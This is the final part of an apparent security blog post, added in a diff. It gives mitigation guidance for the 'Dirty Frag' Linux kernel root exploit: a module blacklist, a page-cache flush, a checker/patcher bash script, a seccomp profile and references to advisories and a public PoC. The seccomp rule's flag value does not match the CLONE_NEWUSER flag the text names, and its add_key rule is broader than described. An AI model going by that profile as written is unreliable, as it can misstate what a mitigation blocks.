+        Running <span class="ic">echo 3 > /proc/sys/vm/drop_caches</span> on a busy server will cause a sudden spike in disk I/O as all cached file data is re-read from disk. On systems with large working sets this can cause a brief performance impact. Do it during a maintenance window or use targeted per-file cache inspection tools if available.
+      </div>
+    </div>
+  </section>
+
+  <hr class="section-divider">
+
+  <!-- SECTION 8 — Mitigation -->
+  <section class="article-section" id="s7">
+    <h2 class="section-heading"><i class="sh-icon fa-solid fa-shield-halved"></i> Mitigation — Check and Patch Now</h2>
+
+    <div class="subsection">
+      <h3 class="subsection-heading">Patch Status</h3>
+      <p>The xfrm-ESP fix (CVE-2026-43284) is commit <span class="ic">f4c50a4034e6</span> in the <span class="ic">netdev/net</span> tree, merged May 7, 2026. It sets the <span class="ic">SKBFL_SHARED_FRAG</span> flag on pages that enter via <span class="ic">splice()</span> in the IPv4/IPv6 datagram append paths, and modifies the <span class="ic">skip_cow</span> branch in <span class="ic">esp4_input</span> and <span class="ic">esp6_input</span> to check that flag — routing any skb with externally-pinned pages through the safe <span class="ic">skb_cow_data()</span> path.</p>
+      <p>The RxRPC fix (CVE-2026-43500) is a submitted patch (lore.kernel.org <span class="ic">afKV2zGR6rrelPC7@v4bel</span>) that adds <span class="ic">|| skb->data_len</span> to the clone-check gate in <span class="ic">call_event.c</span> and <span class="ic">conn_event.c</span>, ensuring non-linear skbs also go through <span class="ic">skb_copy()</span> before in-place decrypt. It has not yet been merged into any mainline or stable tree.</p>
+      <p>No distribution has shipped either fix through standard update channels as of May 8, 2026.</p>
+    </div>
+
+    <div class="subsection">
+      <h3 class="subsection-heading">Immediate Mitigation — Blacklist the Three Modules</h3>
+      <p>The attack surface for both variants can be removed by blacklisting the three kernel modules involved. This does not affect standard disk encryption (LUKS/dm-crypt), TLS, or OpenSSL. <strong>Do not apply this on hosts that terminate or transit IPsec tunnels (strongSwan, Libreswan)</strong> — disabling <span class="ic">esp4</span>/<span class="ic">esp6</span> will break the IPsec data path on those machines. For all other servers, this is a safe and immediate fix.</p>
+
+      <p>This is the exact mitigation command from the official researcher disclosure and confirmed by CloudLinux, AlmaLinux, and Red Hat advisories:</p>
+      <code class="run-cmd">sudo sh -c "printf 'install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n' > /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxrpc 2>/dev/null; true"</code>
+
+      <p>After applying the module blacklist, also flush the page cache. This is a separate but important step: if the exploit was already run on your system before the blacklist was in place, the page cache may still contain poisoned in-memory versions of system binaries. Flushing it forces all files to be re-read from the clean on-disk copies on next access:</p>
+      <code class="run-cmd">sudo sh -c "echo 3 > /proc/sys/vm/drop_caches"</code>
+
+      <div class="callout callout-warn">
+        <strong>Note — "Copy Fail 2: Electric Boogaloo" alias</strong>
+        An earlier proof-of-concept repository published as "Copy Fail 2: Electric Boogaloo" refers to the same Dirty Frag vulnerability under a different name. There is no separate CVE for it. The canonical PoC is <a href="https://github.com/V4bel/dirtyfrag" target="_blank" rel="noopener">github.com/V4bel/dirtyfrag</a> by Hyunwoo Kim. The same mitigation applies regardless of which name you encounter.
+      </div>
+    </div>
+
+    <div class="subsection">
+      <h3 class="subsection-heading">Automated Check &amp; Patch Script</h3>
+      <div class="code-block">
+        <div class="cb-header"><span class="cb-lang">Bash</span><span class="cb-file">dirtyfrag-patch.sh</span></div>
+        <pre><code><span class="hl-str">#!/usr/bin/env bash</span>
+<span class="hl-cm"># CVE-2026-43284 / CVE-2026-43500 (Dirty Frag) — Checker &amp; Patcher
+# Blacklists esp4, esp6, rxrpc to remove Dirty Frag attack surface.
+# Drops page cache to flush any prior exploitation.
+# Safe on non-IPsec, non-AFS servers. Idempotent.</span>
+
+<span class="hl-kw">set</span> -euo pipefail
+
+<span class="hl-macro">RED</span>=<span class="hl-str">'\033[0;31m'</span>; <span class="hl-macro">GREEN</span>=<span class="hl-str">'\033[0;32m'</span>; <span class="hl-macro">YELLOW</span>=<span class="hl-str">'\033[1;33m'</span>
+<span class="hl-macro">CYAN</span>=<span class="hl-str">'\033[0;36m'</span>;  <span class="hl-macro">BOLD</span>=<span class="hl-str">'\033[1m'</span>;    <span class="hl-macro">NC</span>=<span class="hl-str">'\033[0m'</span>
+<span class="hl-macro">CONF</span>=<span class="hl-str">"/etc/modprobe.d/dirtyfrag.conf"</span>
+<span class="hl-macro">MODS</span>=(<span class="hl-str">"esp4"</span> <span class="hl-str">"esp6"</span> <span class="hl-str">"rxrpc"</span>)
+
+<span class="hl-fn">banner</span>() {
+  echo -e <span class="hl-str">"${CYAN}"</span>
+  echo <span class="hl-str">"  ╔═══════════════════════════════════════════════════╗"</span>
+  echo <span class="hl-str">"  ║  CVE-2026-43284/43500 · Dirty Frag · Checker v1.0 ║"</span>
+  echo <span class="hl-str">"  ╚═══════════════════════════════════════════════════╝"</span>
+  echo -e <span class="hl-str">"${NC}"</span>
+}
+
+<span class="hl-fn">check_root</span>() {
+  [[ $EUID -eq 0 ]] || { echo -e <span class="hl-str">"${YELLOW}[!] Re-run with sudo to apply fixes.${NC}"</span>; }
+}
+
+<span class="hl-fn">check_mitigation_applied</span>() {
+  [[ -f <span class="hl-str">"$CONF"</span> ]] && grep -q esp4 <span class="hl-str">"$CONF"</span> && grep -q rxrpc <span class="hl-str">"$CONF"</span>
+}
+
+<span class="hl-fn">check_modules</span>() {
+  echo -e <span class="hl-str">"${BOLD}[*] Module status:${NC}"</span>
+  <span class="hl-kw">for</span> mod <span class="hl-kw">in</span> <span class="hl-str">"${MODS[@]}"</span>; <span class="hl-kw">do</span>
+    <span class="hl-kw">if</span> lsmod 2>/dev/null | grep -q <span class="hl-str">"^${mod}"</span>; <span class="hl-kw">then</span>
+      echo -e <span class="hl-str">"  ${RED}[✗] ${mod} is LOADED${NC}"</span>
+    <span class="hl-kw">elif</span> modinfo <span class="hl-str">"$mod"</span> &>/dev/null; <span class="hl-kw">then</span>
+      echo -e <span class="hl-str">"  ${YELLOW}[!] ${mod} available but not loaded${NC}"</span>
+    <span class="hl-kw">else</span>
+      echo -e <span class="hl-str">"  ${GREEN}[✓] ${mod} not available on this system${NC}"</span>
+    <span class="hl-kw">fi</span>
+  <span class="hl-kw">done</span>
+}
+
+<span class="hl-fn">apply_patch</span>() {
+  printf <span class="hl-str">'install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n'</span> > <span class="hl-str">"$CONF"</span>
+  echo -e <span class="hl-str">"${GREEN}[✓] Created ${CONF}${NC}"</span>
+  <span class="hl-kw">for</span> mod <span class="hl-kw">in</span> <span class="hl-str">"${MODS[@]}"</span>; <span class="hl-kw">do</span>
+    modprobe -r <span class="hl-str">"$mod"</span> 2>/dev/null \
+      && echo -e <span class="hl-str">"${GREEN}[✓] Unloaded ${mod}${NC}"</span> \
+      || echo -e <span class="hl-str">"${YELLOW}[i] ${mod} was not loaded${NC}"</span>
+  <span class="hl-kw">done</span>
+  echo <span class="hl-str">3</span> > /proc/sys/vm/drop_caches
+  echo -e <span class="hl-str">"${GREEN}[✓] Page cache flushed${NC}"</span>
+  echo
+  echo -e <span class="hl-str">"${GREEN}${BOLD}[✓] MITIGATED — esp4, esp6, rxrpc blocked. Page cache cleared.${NC}"</span>
+  echo -e <span class="hl-str">"${CYAN}[i] Remove ${CONF} after your distro ships patched kernels.${NC}"</span>
+}
+
+<span class="hl-fn">main</span>() {
+  <span class="hl-fn">banner</span>; <span class="hl-fn">check_root</span>; echo
+  echo -e <span class="hl-str">"${BOLD}[*] Kernel: $(uname -r)${NC}"</span>; echo
+  <span class="hl-fn">check_modules</span>; echo
+
+  <span class="hl-kw">if</span> <span class="hl-fn">check_mitigation_applied</span>; <span class="hl-kw">then</span>
+    echo -e <span class="hl-str">"${GREEN}${BOLD}[✓] Mitigation already in place — ${CONF}${NC}"</span>
+    <span class="hl-kw">exit</span> 0
+  <span class="hl-kw">fi</span>
+
+  echo -e <span class="hl-str">"${RED}${BOLD}[!] VULNERABLE: Dirty Frag (CVE-2026-43284 / CVE-2026-43500)${NC}"</span>
+  echo -e <span class="hl-str">"${RED}    Public PoC available. Any local user can become root.${NC}"</span>; echo
+
+  <span class="hl-kw">if</span> [[ $EUID -ne 0 ]]; <span class="hl-kw">then</span>
+    echo -e <span class="hl-str">"${YELLOW}[!] Run as root to apply: sudo $0${NC}"</span>; <span class="hl-kw">exit</span> 1
+  <span class="hl-kw">fi</span>
+
+  read -rp <span class="hl-str">"$(echo -e "${YELLOW}Apply mitigation now? [y/N]: ${NC}")"</span> CONFIRM
+  [[ <span class="hl-str">"$CONFIRM"</span> =~ ^[Yy]$ ]] && <span class="hl-fn">apply_patch</span> || echo -e <span class="hl-str">"${YELLOW}[!] Not applied. System remains vulnerable.${NC}"</span>
+}
+
+<span class="hl-fn">main</span> <span class="hl-str">"$@"</span></code></pre>
+      </div>
+
+      <code class="run-cmd">chmod +x dirtyfrag-patch.sh && sudo ./dirtyfrag-patch.sh</code>
+    </div>
+
+    <div class="subsection">
+      <h3 class="subsection-heading">Container and Kubernetes Hardening</h3>
+      <p>The ESP variant can escape container boundaries via the shared page cache, just like Copy Fail. A seccomp profile blocking <span class="ic">unshare()</span> with <span class="ic">CLONE_NEWUSER</span> prevents the ESP variant from running inside containers. To block both variants, also restrict <span class="ic">add_key</span> with type <span class="ic">"rxrpc"</span>:</p>
+      <div class="code-block">
+        <div class="cb-header"><span class="cb-lang">JSON</span><span class="cb-file">seccomp-deny-dirtyfrag.json</span></div>
+        <pre><code>{
+  <span class="hl-str">"defaultAction"</span>: <span class="hl-str">"SCMP_ACT_ALLOW"</span>,
+  <span class="hl-str">"syscalls"</span>: [
+    {
+      <span class="hl-str">"names"</span>: [<span class="hl-str">"unshare"</span>],
+      <span class="hl-str">"action"</span>: <span class="hl-str">"SCMP_ACT_ERRNO"</span>,
+      <span class="hl-str">"args"</span>: [{<span class="hl-str">"index"</span>: <span class="hl-num">0</span>, <span class="hl-str">"value"</span>: <span class="hl-num">1073741824</span>, <span class="hl-str">"op"</span>: <span class="hl-str">"SCMP_CMP_MASKED_EQ"</span>, <span class="hl-str">"valueTwo"</span>: <span class="hl-num">1073741824</span>}]
+    },
+    {
+      <span class="hl-str">"names"</span>: [<span class="hl-str">"add_key"</span>],
+      <span class="hl-str">"action"</span>: <span class="hl-str">"SCMP_ACT_ERRNO"</span>
+    }
+  ]
+}</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <strong>Track Patch Status</strong>
+        xfrm-ESP fix: commit <span class="ic">f4c50a4034e6</span> (netdev/net tree). RxRPC fix: pending merge, see <a href="https://lore.kernel.org/all/afKV2zGR6rrelPC7@v4bel/" target="_blank" rel="noopener">lore.kernel.org patch</a>. Distro trackers: Ubuntu (<a href="https://ubuntu.com/security/CVE-2026-43284" target="_blank" rel="noopener">ubuntu.com/security/CVE-2026-43284</a>), RHEL (<a href="https://access.redhat.com/security/vulnerabilities/RHSB-2026-003" target="_blank" rel="noopener">access.redhat.com</a>), AlmaLinux (<a href="https://almalinux.org/blog/2026-05-07-dirty-frag/" target="_blank" rel="noopener">almalinux.org</a>). Until patched kernels land in your package manager, the module blacklist is the correct mitigation.
+      </div>
+    </div>
+  </section>
+
+  <hr class="section-divider">
+
+  <!-- REFERENCES -->
+  <section class="article-section" id="refs">
+    <h2 class="section-heading"><i class="sh-icon fa-solid fa-book-open"></i> References &amp; Further Reading</h2>
+    <div class="refs-list">
+
+      <div class="ref-item">
+        <div class="ref-meta">
+          <span class="ref-tag ref-tag-primary">Primary Source</span>
+          <span class="ref-url">github.com/V4bel/dirtyfrag</span>
+        </div>
+        <a class="ref-title" href="https://github.com/V4bel/dirtyfrag" target="_blank" rel="noopener noreferrer">Dirty Frag — Official Disclosure, PoC, and Write-up by Hyunwoo Kim</a>
+        <p>The complete technical write-up (write-up.md), exploit source (exp.c), and disclosure timeline. Includes the full root cause analysis of both the ESP and RxRPC variants, exploit flow diagrams, and the submitted upstream patches.</p>
+      </div>
+
+      <div class="ref-item">
+        <div class="ref-meta">
+          <span class="ref-tag ref-tag-patch">Upstream Patch</span>
+          <span class="ref-url">kernel.org</span>
+        </div>
+        <a class="ref-title" href="https://git.kernel.org/pub/scm/linux/kernel/git/netdev/net.git/commit/?id=f4c50a4034e62ab75f1d5cdd191dd5f9c77fdff4" target="_blank" rel="noopener noreferrer">Kernel Fix: f4c50a4034e6 — SKBFL_SHARED_FRAG check in esp_input / esp6_input</a>
+        <p>The merged fix for CVE-2026-43284. Sets <span class="ic">SKBFL_SHARED_FRAG</span> in the IPv4/IPv6 datagram append paths when <span class="ic">splice()</span> supplies pages, and checks this flag in <span class="ic">esp_input()</span>/<span class="ic">esp6_input()</span> to force the safe <span class="ic">skb_cow_data()</span> path for externally-pinned pages.</p>
+      </div>
+
+      <div class="ref-item">
+        <div class="ref-meta">
+          <span class="ref-tag ref-tag-research">Research</span>
+          <span class="ref-url">bleepingcomputer.com</span>
+        </div>
+        <a class="ref-title" href="https://www.bleepingcomputer.com/news/security/new-linux-dirty-frag-zero-day-with-poc-exploit-gives-root-privileges/" target="_blank" rel="noopener noreferrer">BleepingComputer — New Linux 'Dirty Frag' Zero-Day Gives Root on All Major Distros</a>
+        <p>Coverage of the public disclosure event including the broken embargo context, CVSS scoring, and affected distribution summary.</p>
+      </div>
+
+      <div class="ref-item">
+        <div class="ref-meta">
+          <span class="ref-tag ref-tag-advisory">Advisory</span>
+          <span class="ref-url">almalinux.org</span>
+        </div>
+        <a class="ref-title" href="https://almalinux.org/blog/2026-05-07-dirty-frag/" target="_blank" rel="noopener noreferrer">AlmaLinux — Dirty Frag (CVE-2026-43284, CVE-2026-43500) Patched Kernels in Testing</a>
+        <p>AlmaLinux's advisory covering both CVEs, per-release impact analysis (AlmaLinux 8 is unaffected by the RxRPC variant as it does not build rxrpc.ko), and links to testing repository kernels.</p>
+      </div>
+
+      <div class="ref-item">
+        <div class="ref-meta">
+          <span class="ref-tag ref-tag-advisory">Advisory</span>
+          <span class="ref-url">access.redhat.com</span>
+        </div>
+        <a class="ref-title" href="https://access.redhat.com/security/vulnerabilities/RHSB-2026-003" target="_blank" rel="noopener noreferrer">Red Hat Security Bulletin RHSB-2026-003 — Dirty Frag Networking Subsystem LPE</a>
+        <p>Red Hat's official bulletin covering RHEL 8, 9, and 10 impact, configuration-based mitigations, and the expedited fix timeline.</p>
+      </div>
+
+      <div class="ref-item">
+        <div class="ref-meta">
+          <span class="ref-tag ref-tag-advisory">Disclosure</span>
+          <span class="ref-url">openwall.com</span>
+        </div>
+        <a class="ref-title" href="https://www.openwall.com/lists/oss-security/2026/05/07/8" target="_blank" rel="noopener noreferrer">oss-security: Hyunwoo Kim — Full Dirty Frag Public Disclosure (2026-05-07)</a>
+        <p>The canonical public disclosure post on the oss-security mailing list, published after the embargo was broken by a third party. Contains the full technical description, timeline, and links to patches. This is the primary source all vendor advisories reference.</p>
+      </div>
+
+      <div class="ref-item">
+        <div class="ref-meta">
+          <span class="ref-tag ref-tag-research">Related</span>
+          <span class="ref-url">copy.fail</span>
+        </div>
+        <a class="ref-title" href="https://copy.fail" target="_blank" rel="noopener noreferrer">Copy Fail (CVE-2026-31431) — The Predecessor That Motivated Dirty Frag Research</a>
+        <p>The Copy Fail disclosure by Taeyang Lee that directly motivated Hyunwoo Kim's research into related page-cache write primitives in other kernel subsystems. Understanding Copy Fail is essential context for Dirty Frag. Dirty Frag exploits the same <span class="ic">authencesn_decrypt()</span> sink via a different entry path, and bypasses the Copy Fail mitigation entirely.</p>
+      </div>
+
+    </div>
+  </section>
+
+</div>
+</main>
+
+<footer>
+  <div class="footer-inner">
+    <span class="footer-logo">cyb3r-w0lf</span>
+    <p>Copyright &copy; 2026 Akileshkumar — All Rights Reserved.</p>
+    <div class="footer-links">
+      <a href="./index.html">All Posts</a>
+      <a href="../index.html">Portfolio</a>
+      <a href="../index.html#about">Contact</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('.code-block').forEach(function(block){
+  var header=block.querySelector('.cb-header');
+  var code=block.querySelector('pre code');
+  if(!header||!code)return;
+  var btn=document.createElement('button');
+  btn.className='copy-btn';
+  btn.innerHTML='<i class="fa-regular fa-copy"></i> Copy';
+  btn.addEventListener('click',function(){
+    navigator.clipboard.writeText(code.innerText).then(function(){
+      btn.innerHTML='<i class="fa-solid fa-check"></i> Copied';
+      btn.classList.add('copied');
+      setTimeout(function(){
+        btn.innerHTML='<i class="fa-regular fa-copy"></i> Copy';
+        btn.classList.remove('copied');
+      },2000);
+    });
+  });
+  header.appendChild(btn);
+});
+</script>
+</body>
+</html>
